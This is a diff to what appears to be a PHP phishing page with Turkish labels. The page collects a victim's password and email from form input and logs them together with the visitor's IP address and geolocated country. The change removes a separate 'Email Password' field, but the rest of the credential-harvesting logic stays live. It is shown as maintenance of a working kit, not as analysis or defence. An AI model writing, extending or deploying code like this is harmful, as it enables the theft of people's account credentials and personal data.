@@ -33,9 +33,7 @@ if(isset($_GET['comen']))
     \$_SIFRE         : " . $_GET['password'] . "
     
     \$_EPOSTA        : " . $_GET['email'] . "
-    
-    \$_EPOSTA_SIF    : " . $_GET['emailPassword'] . "
-    
+   
     \$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
     
     \$_ULKE          : " . $json['country'] . "
@@ -114,9 +112,6 @@ if(isset($_GET['comen']))
             </div>
             <div class="mb-3">
                 <input type="email" name="email" id="email" class="form-input" placeholder="Email" required autocomplete="off">
-            </div>
-            <div class="mb-3">
-                <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password" required autocomplete="off">
             </div>
             <div class="mb-3">
                 <select name="category" id="category" class="form-input">
